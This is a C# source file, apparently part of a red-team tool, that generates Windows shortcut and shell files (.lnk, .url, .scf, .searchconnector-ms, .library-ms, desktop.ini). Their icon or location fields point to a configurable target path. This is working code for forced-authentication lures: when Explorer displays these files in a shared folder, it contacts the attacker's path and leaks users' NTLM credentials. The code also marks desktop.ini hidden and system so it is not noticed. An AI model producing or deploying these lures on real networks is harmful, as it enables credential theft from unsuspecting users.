using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace Workflow
{

    class CropHelper
    {

        // https://stackoverflow.com/questions/139010/how-to-resolve-a-lnk-in-c-sharp
        #region Signitures imported from http://pinvoke.net

        [DllImport("shfolder.dll", CharSet = CharSet.Auto)]
        internal static extern int SHGetFolderPath(
            IntPtr hwndOwner, int nFolder, IntPtr hToken,
            int dwFlags, StringBuilder lpszPath);

        [Flags()]
        enum SLGP_FLAGS
        {
            SLGP_SHORTPATH = 0x1,
            SLGP_UNCPRIORITY = 0x2,
            SLGP_RAWPATH = 0x4
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct WIN32_FIND_DATAW
        {
            public uint dwFileAttributes;
            public long ftCreationTime;
            public long ftLastAccessTime;
            public long ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }

        [Flags()]
        enum SLR_FLAGS
        {
            SLR_NO_UI = 0x1,
            SLR_ANY_MATCH = 0x2,
            SLR_UPDATE = 0x4,
            SLR_NOUPDATE = 0x8,
            SLR_NOSEARCH = 0x10,
            SLR_NOTRACK = 0x20,
            SLR_NOLINKINFO = 0x40,
            SLR_INVOKE_MSI = 0x80
        }

        [ComImport(), InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
         Guid("000214F9-0000-0000-C000-000000000046")]
        interface IShellLinkW
        {
            void GetPath(
                [Out(), MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszFile,
                int cchMaxPath,
                out WIN32_FIND_DATAW pfd,
                SLGP_FLAGS fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription(
                [Out(), MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszName,
                int cchMaxName);
            void SetDescription(
                [MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory(
                [Out(), MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszDir,
                int cchMaxPath);
            void SetWorkingDirectory(
                [MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments(
                [Out(), MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszArgs,
                int cchMaxPath);
            void SetArguments(
                [MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation(
                [Out(), MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszIconPath,
                int cchIconPath,
                out int piIcon);
            void SetIconLocation(
                [MarshalAs(UnmanagedType.LPWStr)] string pszIconPath,
                int iIcon);
            void SetRelativePath(
                [MarshalAs(UnmanagedType.LPWStr)] string pszPathRel,
                int dwReserved);
            void Resolve(IntPtr hwnd, SLR_FLAGS fFlags);
            void SetPath(
                [MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        [ComImport, Guid("0000010c-0000-0000-c000-000000000046"),
         InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersist
        {
            [PreserveSig]
            void GetClassID(out Guid pClassID);
        }

        [ComImport, Guid("0000010b-0000-0000-C000-000000000046"),
         InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersistFile : IPersist
        {
            new void GetClassID(out Guid pClassID);
            [PreserveSig]
            int IsDirty();
            [PreserveSig]
            void Load(
                [In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName,
                uint dwMode);
            [PreserveSig]
            void Save(
                [In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName,
                [In, MarshalAs(UnmanagedType.Bool)] bool fRemember);
            [PreserveSig]
            void SaveCompleted(
                [In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
            [PreserveSig]
            void GetCurFile(
                [In, MarshalAs(UnmanagedType.LPWStr)] string ppszFileName);
        }

        const uint STGM_READ = 0;
        const int MAX_PATH = 260;

        [ComImport(), Guid("00021401-0000-0000-C000-000000000046")]
        public class ShellLink
        {
        }

        #endregion

        public static void CreateLNKCrop(
            string destOut, Config config)
        {
            var shellLink = new ShellLink();
            ((IShellLinkW)shellLink).SetDescription("Shortcut");
            ((IShellLinkW)shellLink).SetPath(config.targetPath);
            ((IShellLinkW)shellLink).SetIconLocation(
                config.targetIcon, 12);
            ((IPersistFile)shellLink).Save(destOut, false);
        }

        public static void CreateFileCrop(
            string destOut, Config config)
        {
            var output = "";
            string filename = config.targetFilename.ToLower();

            if (filename.EndsWith(".url"))
            {
                output =
                    "[InternetShortcut]\r\n" +
                    "URL=file://" + config.targetPath + "\r\n" +
                    "IconFile=" + config.targetPath + "\r\n" +
                    "IconIndex=0\r\n";
            }
            else if (filename.EndsWith(".searchconnector-ms"))
            {
                output =
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<searchConnectorDescription xmlns=" +
                    "\"http://schemas.microsoft.com/windows/" +
                    "2009/searchConnector\">\n" +
                    "    <iconReference>imageres.dll,-1002" +
                    "</iconReference>\n" +
                    "    <description>Microsoft Outlook" +
                    "</description>\n" +
                    "    <isSearchOnlyItem>false" +
                    "</isSearchOnlyItem>\n" +
                    "    <includeInStartMenuScope>true" +
                    "</includeInStartMenuScope>\n" +
                    "    <iconReference>" + config.targetPath +
                    "</iconReference>\n" +
                    "    <templateInfo>" +
                    "        <folderType>" +
                    "{91475FE5-586B-4EBA-8D75-D17434B8CDF6}" +
                    "</folderType>\n" +
                    "    </templateInfo>\n" +
                    "    <simpleLocation>\n" +
                    "        <url>" + config.targetPath +
                    "</url>\n" +
                    "    </simpleLocation>\n" +
                    "</searchConnectorDescription>\n";
            }
            else if (filename.EndsWith(".library-ms"))
            {
                output =
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<libraryDescription xmlns=" +
                    "\"http://schemas.microsoft.com/windows/" +
                    "2009/library\">\n" +
                    "  <name>@windows.storage.dll,-34582</name>\n" +
                    "  <version>6</version>\n" +
                    "  <isLibraryPinned>true</isLibraryPinned>\n" +
                    "  <iconReference>imageres.dll,-1003" +
                    "</iconReference>\n" +
                    "  <templateInfo>" +
                    "    <folderType>" +
                    "{7d49d726-3c21-4f05-99aa-fdc2c9474656}" +
                    "</folderType>\n" +
                    "  </templateInfo>\n" +
                    "  <searchConnectorDescriptionList>\n" +
                    "    <searchConnectorDescription>\n" +
                    "      <isDefaultSaveLocation>true" +
                    "</isDefaultSaveLocation>\n" +
                    "      <isSupported>false</isSupported>\n" +
                    "      <simpleLocation>\n" +
                    "      <url>" + config.targetPath + "</url>\n" +
                    "      </simpleLocation>\n" +
                    "    </searchConnectorDescription>\n" +
                    "  </searchConnectorDescriptionList>\n" +
                    "</libraryDescription>";
            }
            else if (filename.EndsWith(".scf"))
            {
                output =
                    "[Shell]\r\n" +
                    "Command=2\r\n" +
                    "IconFile=" + config.targetPath + "\\icon.ico\r\n" +
                    "[Taskbar]\r\n" +
                    "Command=ToggleDesktop\r\n";
            }

            File.WriteAllText(destOut, output);
        }

        public static void CreateDesktopIniCrop(
            string destOut, Config config)
        {
            string dirPath = Path.GetDirectoryName(destOut);
            string content =
                "[.ShellClassInfo]\r\n" +
                "IconResource=" + config.targetPath +
                "\\icon.ico,0\r\n";

            File.WriteAllText(destOut, content);

            try
            {
                File.SetAttributes(destOut,
                    FileAttributes.Hidden | FileAttributes.System);
                var dirInfo = new DirectoryInfo(dirPath);
                dirInfo.Attributes |= FileAttributes.System;
            }
            catch
            {
                // Best-effort attribute setting
            }
        }
    }
}
